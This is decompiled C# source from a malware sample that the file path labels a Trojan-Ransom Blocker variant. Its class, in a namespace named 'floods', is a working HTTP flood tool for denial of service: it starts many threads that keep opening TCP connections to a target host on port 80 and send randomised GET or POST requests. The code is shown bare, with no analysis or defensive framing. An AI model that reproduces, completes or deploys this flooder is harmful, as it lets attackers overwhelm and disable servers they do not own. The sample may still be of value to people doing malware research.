// Decompiled with JetBrains decompiler
// Type: rundll32.floods.sls
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace rundll32.floods
{
  internal class sls
  {
    private static string _url;
    private static int _threads;
    private static int _delay;
    private static Thread[] t_list;
    public static bool flooding = false;

    public static bool start(string url, int threads, int delay)
    {
      if (sls.flooding)
        return false;
      sls._url = url;
      sls._threads = threads;
      sls._delay = delay;
      sls.t_list = new Thread[threads];
      sls.flooding = true;
      for (int index = 0; index < threads; ++index)
      {
        sls.t_list[index] = new Thread(new ThreadStart(sls.request));
        sls.t_list[index].Start();
      }
      return true;
    }

    public static bool stop()
    {
      if (!sls.flooding)
        return false;
      sls.flooding = false;
      return true;
    }

    private static void request()
    {
      while (sls.flooding)
      {
        try
        {
          TcpClient tcpClient = new TcpClient();
          tcpClient.Connect(sls._url.Replace("http://", "").Replace("/", ""), 80);
          StreamWriter streamWriter = new StreamWriter((Stream) tcpClient.GetStream());
          Random random = new Random(new Random().Next(10000));
          string str = "GET";
          if (random.Next(1000) > 500)
            str = "POST";
          streamWriter.WriteLine(str + " /" + random.Next(99999).ToString() + " HTTP/1.1\r\n");
          streamWriter.WriteLine("Host: " + sls._url.Replace("http://", "").Replace("/", "") + "\r\n");
          streamWriter.WriteLine("Connection: close\r\n");
          streamWriter.WriteLine("User-Agent: none\r\n");
        }
        catch
        {
        }
        Thread.Sleep(sls._delay);
      }
    }
  }
}
